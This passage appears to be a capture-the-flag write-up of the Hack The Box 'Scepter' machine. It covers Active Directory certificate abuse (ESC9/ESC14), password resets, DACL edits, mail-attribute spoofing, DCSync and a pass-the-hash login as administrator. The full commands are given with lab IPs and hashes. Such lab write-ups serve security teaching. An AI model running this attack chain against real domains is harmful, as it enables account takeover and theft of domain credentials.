<span class="w">    </span><span class="nv">Extended</span><span class="w"> </span><span class="nv">Key</span><span class="w"> </span><span class="nv">Usage</span><span class="w">                  </span>:<span class="w"> </span><span class="nv">Client</span><span class="w"> </span><span class="nv">Authentication</span>
<span class="w">                                          </span><span class="nv">Server</span><span class="w"> </span><span class="nv">Authentication</span>
<span class="w">    </span><span class="nv">Requires</span><span class="w"> </span><span class="nv">Manager</span><span class="w"> </span><span class="nv">Approval</span><span class="w">           </span>:<span class="w"> </span><span class="nv">False</span>
<span class="w">    </span><span class="nv">Requires</span><span class="w"> </span><span class="nv">Key</span><span class="w"> </span><span class="nv">Archival</span><span class="w">               </span>:<span class="w"> </span><span class="nv">False</span>
<span class="w">    </span><span class="nv">Authorized</span><span class="w"> </span><span class="nv">Signatures</span><span class="w"> </span><span class="nv">Required</span><span class="w">      </span>:<span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="nv">Validity</span><span class="w"> </span><span class="nv">Period</span><span class="w">                     </span>:<span class="w"> </span><span class="mi">99</span><span class="w"> </span><span class="nv">years</span>
<span class="w">    </span><span class="nv">Renewal</span><span class="w"> </span><span class="nv">Period</span><span class="w">                      </span>:<span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="nv">weeks</span>
<span class="w">    </span><span class="nv">Minimum</span><span class="w"> </span><span class="nv">RSA</span><span class="w"> </span><span class="nv">Key</span><span class="w"> </span><span class="nv">Length</span><span class="w">              </span>:<span class="w"> </span><span class="mi">2048</span>
<span class="w">    </span><span class="nv">Permissions</span>
<span class="w">      </span><span class="nv">Enrollment</span><span class="w"> </span><span class="nv">Permissions</span>
<span class="w">        </span><span class="nv">Enrollment</span><span class="w"> </span><span class="nv">Rights</span><span class="w">               </span>:<span class="w"> </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">staff</span>
<span class="w">      </span><span class="nv">Object</span><span class="w"> </span><span class="nv">Control</span><span class="w"> </span><span class="nv">Permissions</span>
<span class="w">        </span><span class="nv">Owner</span><span class="w">                           </span>:<span class="w"> </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Enterprise</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">        </span><span class="nv">Full</span><span class="w"> </span><span class="nv">Control</span><span class="w"> </span><span class="nv">Principals</span><span class="w">         </span>:<span class="w"> </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Domain</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Local</span><span class="w"> </span><span class="nv">System</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Enterprise</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">        </span><span class="nv">Write</span><span class="w"> </span><span class="nv">Owner</span><span class="w"> </span><span class="nv">Principals</span><span class="w">          </span>:<span class="w"> </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Domain</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Local</span><span class="w"> </span><span class="nv">System</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Enterprise</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">        </span><span class="nv">Write</span><span class="w"> </span><span class="nv">Dacl</span><span class="w"> </span><span class="nv">Principals</span><span class="w">           </span>:<span class="w"> </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Domain</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Local</span><span class="w"> </span><span class="nv">System</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Enterprise</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">        </span><span class="nv">Write</span><span class="w"> </span><span class="nv">Property</span><span class="w"> </span><span class="nv">Principals</span><span class="w">       </span>:<span class="w"> </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Domain</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Local</span><span class="w"> </span><span class="nv">System</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Enterprise</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">    </span>[<span class="o">!</span>]<span class="w"> </span><span class="nv">Vulnerabilities</span>
<span class="w">      </span><span class="nv">ESC9</span><span class="w">                              </span>:<span class="w"> </span><span class="s1">&#39;SCEPTER.HTB\\staff&#39;</span><span class="w"> </span><span class="nv">can</span><span class="w"> </span><span class="nv">enroll</span><span class="w"> </span><span class="nv">and</span><span class="w"> </span><span class="nv">template</span><span class="w"> </span><span class="nv">has</span><span class="w"> </span><span class="nv">no</span><span class="w"> </span><span class="nv">security</span><span class="w"> </span><span class="nv">extension</span>
</code></pre></div>

<p>ESC9 will allow me to request a certificate with an UPN of a different user in order to authenticate as them.</p>
<p>Only the members of STAFF can enroll in this template, which means that d.baker will be eligible to do that.</p>
<h2>Abusing ESC9 with StaffAccessCertificate template</h2>
<p><img alt="missingmail" src="../images/Scepter/missingmail.png" /></p>
<p>It looks like d.baker doesn't have an email set. I can fix that after getting the full rights over them with a.carter. Then I'll be able to modify the appropriate attribute via ldapmodify.</p>
<h3>Adding the email to d.baker with ldapmodify</h3>
<div class="codehilite"><pre><span></span><code><span class="n">sudo</span><span class="w"> </span><span class="n">bloodyAD</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">scepter</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">d</span><span class="p">.</span><span class="n">baker</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="n">helpdesk</span><span class="o">/</span><span class="n">baker</span><span class="p">.</span><span class="k">key</span><span class="err">:</span><span class="n">helpdesk</span><span class="o">/</span><span class="n">baker</span><span class="p">.</span><span class="n">crt</span><span class="w"> </span><span class="o">--</span><span class="k">host</span><span class="w"> </span><span class="n">dc01</span><span class="p">.</span><span class="n">scepter</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">--</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.129.170.80</span><span class="w">  </span><span class="k">set</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">carter</span><span class="w"> </span><span class="n">P</span><span class="nv">@ssword</span>

<span class="o">-</span><span class="w"> </span><span class="n">Resets</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">carter</span><span class="p">.</span><span class="w"> </span><span class="n">There</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">policy</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">requires</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">least</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="n">capital</span><span class="w"> </span><span class="n">letter</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">special</span><span class="w"> </span><span class="k">character</span><span class="p">.</span>

<span class="n">impacket</span><span class="o">-</span><span class="n">dacledit</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.129.170.80</span><span class="w"> </span><span class="o">-</span><span class="n">principal</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">carter</span><span class="w"> </span><span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">dn</span><span class="w"> </span><span class="s1">&#39;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&#39;</span><span class="w"> </span><span class="o">-</span><span class="k">action</span><span class="w"> </span><span class="k">write</span><span class="w"> </span><span class="o">-</span><span class="n">rights</span><span class="w"> </span><span class="n">FullControl</span><span class="w"> </span><span class="o">-</span><span class="n">inheritance</span><span class="w"> </span><span class="n">scepter</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">a</span><span class="p">.</span><span class="nl">carter</span><span class="p">:</span><span class="n">P</span><span class="nv">@ssword</span>

<span class="o">-</span><span class="w"> </span><span class="n">Gives</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">carter</span><span class="w"> </span><span class="k">full</span><span class="w"> </span><span class="n">rights</span><span class="w"> </span><span class="k">over</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">OU</span><span class="p">.</span><span class="w"> </span><span class="n">Notice</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">inheritance</span><span class="w"> </span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="k">grant</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">same</span><span class="w"> </span><span class="n">rights</span><span class="w"> </span><span class="k">over</span><span class="w"> </span><span class="n">everything</span><span class="w"> </span><span class="n">conainted</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">OU</span><span class="p">.</span>
</code></pre></div>

<p>With this, I will be able to write into every attribute of d.baker.</p>
<p>Im going to use ldapmodify and a custom .ldif file to specify the changes I want to make.</p>
<div class="codehilite"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">Contents</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">mail</span><span class="p">.</span><span class="nx">ldif</span><span class="w"> </span><span class="nx">file</span>

<span class="nx">dn</span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="p">=</span><span class="nx">d</span><span class="p">.</span><span class="nx">baker</span><span class="p">,</span><span class="nx">OU</span><span class="p">=</span><span class="nx">Staff</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">Certificate</span><span class="p">,</span><span class="nx">DC</span><span class="p">=</span><span class="nx">scepter</span><span class="p">,</span><span class="nx">DC</span><span class="p">=</span><span class="nx">htb</span>
<span class="nx">changetype</span><span class="p">:</span><span class="w"> </span><span class="nx">modify</span>
<span class="nx">replace</span><span class="p">:</span><span class="w"> </span><span class="nx">mail</span>
<span class="nx">mail</span><span class="p">:</span><span class="w"> </span><span class="nx">h</span><span class="p">.</span><span class="nx">brown</span><span class="err">@</span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb</span>
</code></pre></div>

<p><code>ldapmodify -x -H ldap://dc01.scepter.htb -D 'A.CARTER@scepter.htb' -w 'P@ssword' -f mail.ldif</code></p>
<p>The attribute has been updated. I can now request the cert once again, and this time it should work.</p>
<p><img alt="cert" src="../images/Scepter/cert.png" /></p>
<p>And now I'll try to auth as h.brown with the requested cert.</p>
<p><code>sudo timedatectl set-ntp off &amp;&amp; sudo rdate -n 10.129.170.80 &amp;&amp; sudo certipy-ad auth -pfx d.baker.pfx -domain scepter.htb -u h.brown</code></p>
<p><img alt="auth" src="../images/Scepter/auth.png" /></p>
<p>I got the hash, but since h.brown is in the protected users group, I'm going to assume that NTLM auth is disabled for them.</p>
<p>Instead, I will use the .ccache to authenticate via kerberos.</p>
<p><code>export KRB5CCNAME=h.brown.ccache</code></p>
<p><code>sudo timedatectl set-ntp off &amp;&amp; sudo rdate -n 10.129.170.80 &amp;&amp; evil-winrm -i dc01.scepter.htb -r scepter.htb</code></p>
<p><img alt="user" src="../images/Scepter/user.png" /></p>
<h1>Root flag</h1>
<p>H.brown is in many groups, but there doesn't seem to be an immediate way to progress forward.</p>
<p>Bloodhound sometimes misses certain obscure rights and privileges. Luckily, there are plenty tools capable of similar enumeration.</p>
<p>I will use bloodyAD to get all objects that are writable by h.brown.</p>
<p><code>sudo timedatectl set-ntp off &amp;&amp; sudo rdate -n 10.129.170.80 &amp;&amp; bloodyAD -d scepter.htb -u h.brown -k --host dc01.scepter.htb --dc-ip 10.129.170.80 get writable --detail</code></p>
<div class="codehilite"><pre><span></span><code>### snippet

distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
altSecurityIdentities: WRITE
</code></pre></div>

<p>H.brown can write into the altSecurityIdentities attribute of p.adams. I can perform an ESC14 to ESC9 attack and use the vulnerable template from before after I modify it.</p>
<p><code>https://www.thehacker.recipes/ad/movement/adcs/certificate-templates</code></p>
<h2>Modifying the altSecurityIdentities attribute of p.adams</h2>
<p>I tried to write multiple things into the attribute, ranging from the issuer/supplier, DN of an overtaken user and even the whole certificate(base64 encoded), but no matter what I did it would keep throwing the name mismatch error.</p>
<p>I decided to compare the properties of h.brown and p.adams. Seeing that the attack chain had worked with h.brown, they may serve as an example of how the attribute should be filled.</p>
<div class="codehilite"><pre><span></span><code><span class="k">Get</span><span class="o">-</span><span class="n">ADUser</span><span class="w"> </span><span class="o">-</span><span class="k">identity</span><span class="w"> </span><span class="n">h</span><span class="p">.</span><span class="n">brown</span><span class="w"> </span><span class="o">-</span><span class="n">Properties</span><span class="w"> </span><span class="o">*</span>
<span class="k">Get</span><span class="o">-</span><span class="n">ADUser</span><span class="w"> </span><span class="o">-</span><span class="k">identity</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">adams</span><span class="w"> </span><span class="o">-</span><span class="n">Properties</span><span class="w"> </span><span class="o">*</span>

<span class="err">#</span><span class="w"> </span><span class="n">h</span><span class="p">.</span><span class="n">brown</span>

<span class="n">AccountExpirationDate</span><span class="w">                </span><span class="err">:</span>
<span class="n">accountExpires</span><span class="w">                       </span><span class="err">:</span><span class="w"> </span><span class="mi">0</span>
<span class="n">AccountLockoutTime</span><span class="w">                   </span><span class="err">:</span>
<span class="n">AccountNotDelegated</span><span class="w">                  </span><span class="err">:</span><span class="w"> </span><span class="k">False</span>
<span class="n">AllowReversiblePasswordEncryption</span><span class="w">    </span><span class="err">:</span><span class="w"> </span><span class="k">False</span>
<span class="n">altSecurityIdentities</span><span class="w">                </span><span class="err">:</span><span class="w"> </span><span class="err">{</span><span class="nl">X509</span><span class="p">:</span><span class="o">&lt;</span><span class="n">RFC822</span><span class="o">&gt;</span><span class="n">h</span><span class="p">.</span><span class="n">brown</span><span class="nv">@scepter</span><span class="p">.</span><span class="n">htb</span><span class="err">}</span>
<span class="n">AuthenticationPolicy</span><span class="w">                 </span><span class="err">:</span><span class="w"> </span><span class="err">{}</span>
<span class="n">AuthenticationPolicySilo</span><span class="w">             </span><span class="err">:</span><span class="w"> </span><span class="err">{}</span>
<span class="o">[</span><span class="n">...</span><span class="o">]</span>

<span class="err">#</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">adams</span>

<span class="n">AccountExpirationDate</span><span class="w">                </span><span class="err">:</span>
<span class="n">accountExpires</span><span class="w">                       </span><span class="err">:</span><span class="w"> </span><span class="mi">0</span>
<span class="n">AccountLockoutTime</span><span class="w">                   </span><span class="err">:</span>
<span class="n">AccountNotDelegated</span><span class="w">                  </span><span class="err">:</span><span class="w"> </span><span class="k">False</span>
<span class="n">AllowReversiblePasswordEncryption</span><span class="w">    </span><span class="err">:</span><span class="w"> </span><span class="k">False</span>
<span class="n">AuthenticationPolicy</span><span class="w">                 </span><span class="err">:</span><span class="w"> </span><span class="err">{}</span>
<span class="n">AuthenticationPolicySilo</span><span class="w">             </span><span class="err">:</span><span class="w"> </span><span class="err">{}</span>
<span class="o">[</span><span class="n">...</span><span class="o">]</span>
</code></pre></div>

<p>In hindsight, maybe I should've done this before trying to write anything. I can see that the attribute is completely missing from p.adams. I also got an example of what should be put there, and even why this had worked previously in the first place.</p>
<p>Because h.brown has their email set in the attribute, it allowed me to request a cert and authenticate as them. By setting the exact same email(!) via ldapmodify, I was essentialy able to impersonate h.brown with certipy.</p>
<p>If the email was set to anything different, I would get a name mismatch error.</p>
<h2>ESC14 to ESC9 against p.adams</h2>
<p><code>https://github.com/JonasBK/Powershell/blob/master/Add-AltSecIDMapping.ps1</code></p>
<p>I will be using this script to populate the attribute from within my evil-winrm session on the box.</p>
<p>If the evil-winrm session proves to be too unstable, I will migrate to a better meterpreter session.</p>
<div class="codehilite"><pre><span></span><code><span class="n">upload</span><span class="w"> </span><span class="n">Add</span><span class="o">-</span><span class="n">AltSecIDMapping</span><span class="o">.</span><span class="n">ps1</span>

<span class="o">-</span><span class="w"> </span><span class="n">Upload</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">onto</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">box</span>

<span class="o">.</span><span class="w"> </span><span class="o">./</span><span class="n">Add</span><span class="o">-</span><span class="n">AltSecIDMapping</span><span class="o">.</span><span class="n">ps1</span>

<span class="o">-</span><span class="w"> </span><span class="n">Add</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">session</span><span class="o">.</span>
</code></pre></div>

<p>I'll copy the entry from h.brown's property list, changing the email to p.adams@scepter.htb.</p>
<p><code>Add-AltSecIDMapping -DistinguishedName "CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb" -MappingString "X509:&lt;RFC822&gt;p.adams@scepter.htb"</code></p>
<p><img alt="attribute" src="../images/Scepter/attribute.png" /></p>
<p>There is one more thing I need to change before requesting a cert. I need to change the email of d.baker with ldapmodify, this time to p.adams.</p>
<div class="codehilite"><pre><span></span><code><span class="n">dn</span><span class="o">:</span><span class="w"> </span><span class="n">CN</span><span class="o">=</span><span class="n">d</span><span class="o">.</span><span class="na">baker</span><span class="o">,</span><span class="n">OU</span><span class="o">=</span><span class="n">Staff</span><span class="w"> </span><span class="n">Access</span><span class="w"> </span><span class="n">Certificate</span><span class="o">,</span><span class="n">DC</span><span class="o">=</span><span class="n">scepter</span><span class="o">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="n">changetype</span><span class="o">:</span><span class="w"> </span><span class="n">modify</span>
<span class="n">replace</span><span class="o">:</span><span class="w"> </span><span class="n">mail</span>
<span class="n">mail</span><span class="o">:</span><span class="w"> </span><span class="n">p</span><span class="o">.</span><span class="na">adams</span><span class="err">@</span><span class="n">scepter</span><span class="o">.</span><span class="na">htb</span>
</code></pre></div>

<p>I'll repeat the whole attack chain once again. BloodyAD -&gt; impacket-dacledit -&gt; ldapmodify -&gt; certipy request -&gt; certipy auth</p>
<p><img alt="adamns" src="../images/Scepter/adams.png" /></p>
<h2>DCsync as p.adams</h2>
<p>Since p.adams has DCsync over the domain, I will be able to get the NTLM hashes of every user on the domain.</p>
<p><code>impacket-secretsdump -just-dc -hashes 'aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0' -dc-ip 10.129.170.80 -target-ip 10.129.170.80 scepter.htb/p.adams@10.129.170.80</code></p>
<p><img alt="dcsync" src="../images/Scepter/dcsync.png" /></p>
<p>I'll grab the administrator's hash in order to remote into the machine as them.</p>
<p><code>evil-winrm -i 10.129.170.80 -u administrator -H 'a291ead3493f9773dc615e66c2ea21c4'</code></p>
<p><img alt="root" src="../images/Scepter/root.png" /></p>
<p>Rooted!</p>
            </div>
            
            <div class="toc-sidebar">
                <h3>Contents</h3>
                <ul id="toc-list">
                    <!-- This will be populated by JavaScript -->
                </ul>
            </div>
        </div>
    </main>
    
    <!-- Mobile TOC toggle button -->
    <button class="toc-toggle" aria-label="Toggle table of contents">
        ≡
    </button>
    
    <footer>
        <div class="container">
            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
        </div>
    </footer>

    <!-- Include the Markdown parser (not needed for static HTML) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
    
    <script>
        // Machine metadata for sidebar population
        let machineData = {};
        
        // Function to initialize the application
        async function initializeApp() {
            try {
                // Fetch machine metadata
                const response = await fetch('../machines.json');
                if (!response.ok) {
                    throw new Error('Failed to load machine metadata');
                }
                machineData = await response.json();
                
                // Populate the sidebar with machine links
                populateSidebar();
                
                // Generate table of contents
                generateTableOfContents();
            } catch (error) {
                console.error('Initialization error:', error);
                showError("Failed to initialize application. Please refresh and try again.");
            }
        }

        // Call the initialization function when the page loads
        document.addEventListener('DOMContentLoaded', initializeApp);

        // Populate sidebar with machine links dynamically
        function populateSidebar() {
            const categories = {
                "easy": document.getElementById("easy-machines"),
                "medium": document.getElementById("medium-machines"),
                "hard": document.getElementById("hard-machines"),
                "insane": document.getElementById("insane-machines")
            };

            // Clear existing links
            for (const category of Object.values(categories)) {
                category.innerHTML = '';
            }

            // Add machine links to appropriate categories
            for (const [machineName, data] of Object.entries(machineData)) {
                const difficulty = data.difficulty.toLowerCase();
                if (categories[difficulty]) {
                    const link = document.createElement('a');
                    link.href = `../machines/${machineName}.html`;
                    link.textContent = data.title;
                    
                    // Highlight current machine
                    if (data.title === "Scepter") {
                        link.classList.add('active');
                    }
                    
                    categories[difficulty].appendChild(link);
                }
            }
        }

        // Generate table of contents from headings
        function generateTableOfContents() {
            const writeupBody = document.querySelector('.writeup-body');
            const tocList = document.getElementById('toc-list');
            const headings = writeupBody.querySelectorAll('h1, h2, h3');
            
            // Clear existing TOC
            tocList.innerHTML = '';
            
            headings.forEach((heading, index) => {
                // Create an ID for the heading if it doesn't have one
                if (!heading.id) {
                    // Convert heading text to kebab-case for ID
                    const headingText = heading.textContent.trim();
                    const headingId = headingText
                        .toLowerCase()
                        .replace(/[^\w\s-]/g, '')
                        .replace(/\s+/g, '-');
                    
                    heading.id = headingId || `section-${index}`;
                }
                
                // Create a list item for the TOC
                const listItem = document.createElement('li');
                const link = document.createElement('a');
                link.href = `#${heading.id}`;
                link.textContent = heading.textContent;
                
                // Add a class for h2 elements to create indentation
                if (heading.tagName === 'H2') {
                    listItem.classList.add('sub-heading');
                    listItem.style.paddingLeft = '15px';
                } else if (heading.tagName === 'H3') {
                    listItem.classList.add('sub-sub-heading');
                    listItem.style.paddingLeft = '30px';
                }
                
                listItem.appendChild(link);
                tocList.appendChild(listItem);
            });
            
            // Set up scroll highlighting
            setupScrollHighlighting();
        }

        // Highlight active TOC section on scroll
        function setupScrollHighlighting() {
            const tocLinks = document.querySelectorAll('.toc-sidebar a');
            
            function highlightActiveSection() {
                // Find which section is currently in view
                const fromTop = window.scrollY + 120;
                
                tocLinks.forEach(link => {
                    const section = document.querySelector(link.hash);
                    
                    if (section && 
                        section.offsetTop <= fromTop &&
                        section.offsetTop + section.offsetHeight > fromTop) {
                        link.classList.add('active');
                    } else {
                        link.classList.remove('active');
                    }
                });
            }
            
            // Call initially and on scroll
            window.addEventListener('scroll', highlightActiveSection);
            highlightActiveSection();
        }

        // Show error message
        function showError(message) {
            const contentArea = document.querySelector('.writeup-body');
            contentArea.innerHTML = `
                <div class="error-message">
                    <h2>Error</h2>
                    <p>${message}</p>
                </div>
            `;
        }

        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            // Hamburger menu functionality
            const hamburgerMenu = document.querySelector('.hamburger-menu');
            const sidebar = document.querySelector('.sidebar');
            const backdrop = document.querySelector('.backdrop');
            
            hamburgerMenu.addEventListener('click', () => {
                hamburgerMenu.classList.toggle('active');
                sidebar.classList.toggle('active');
                backdrop.classList.toggle('active');
            });
            
            backdrop.addEventListener('click', () => {
                hamburgerMenu.classList.remove('active');
                sidebar.classList.remove('active');
                backdrop.classList.remove('active');
                tocSidebar.classList.remove('active');
            });
            
            // Difficulty buttons functionality
            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
            
            difficultyButtons.forEach(button => {
                button.addEventListener('click', () => {
                    const difficulty = button.getAttribute('data-difficulty');
                    const machineList = document.querySelector(`#${difficulty}-machines`);
                    
                    machineList.classList.toggle('active');
                });
            });
            
            // Mobile TOC toggle
            const tocToggle = document.querySelector('.toc-toggle');
            const tocSidebar = document.querySelector('.toc-sidebar');
            
            tocToggle.addEventListener('click', () => {
                tocSidebar.classList.toggle('active');
                backdrop.classList.toggle('active');
            });
            
            // Close TOC sidebar when clicking on a link (mobile)
            document.querySelectorAll('.toc-sidebar a').forEach(link => {
                link.addEventListener('click', () => {
                    if (window.innerWidth <= 1024) {
                        tocSidebar.classList.remove('active');
                        backdrop.classList.remove('active');
                    }
                });
            });
        });

        // Add smooth scrolling for TOC links
        document.addEventListener('click', function(e) {
            if (e.target.tagName === 'A' && e.target.hash) {
                const element = document.querySelector(e.target.hash);
                if (element) {
                    e.preventDefault();
                    window.scrollTo({
                        top: element.offsetTop - 90,
                        behavior: 'smooth'
                    });
                }
            }
        });
    </script>
</body>
</html>